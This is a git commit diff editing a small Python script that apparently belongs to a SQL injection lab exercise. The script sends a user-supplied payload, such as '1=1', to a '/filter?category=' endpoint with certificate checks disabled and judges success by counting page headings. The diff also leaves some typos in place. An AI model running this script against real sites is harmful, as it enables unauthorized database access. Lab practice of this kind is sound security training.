aa92ea512ada0be48dd42efc692230569e3309b3
cyb3ritic <cyb3ritic@gmail.com>
2024-04-16 10:18:51 +0530

    edit SQLI_lab_01.py

--- SQLi/SQLI_lab_01.py
+++ SQLi/SQLI_lab_01.py
@@ -2,7 +2,9 @@
 
 import requests
 import sys
-import urllib
+import urllib3
+from bs4 import BeautifulSoup as bs
+
 
 proxies = {'http' : 'http://124.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}
 
@@ -10,15 +12,19 @@ def exploit_SQLi(url,payload):
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
     print(r.text)
-    return True
+    soup = bs(r.text)
+    if len(soup.find_all('h3')) > 12:
+        return True
+    else:
+        return False
 
 if __name__ == '__main__':
     try:
-        url = sys.arg[1].strip()
-        payload = sys.arg[2].strip()
-    except indexError:
-        print("[-] usage: %s <url> <payload>", sys.arg[0])
-        print("[-] example: %s www.example.com '1=1'", sys.arg[0])
+        url = sys.argv[1].strip()
+        payload = sys.argv[2].strip()
+    except IndexError:
+        print("[-] usage: %s <url> <payload>", sys.arvg[0])
+        print("[-] example: %s www.example.com '1=1'", sys.argv[0])
         sys.exit(-1)
         
 if exploit_SQLi(url,payload):
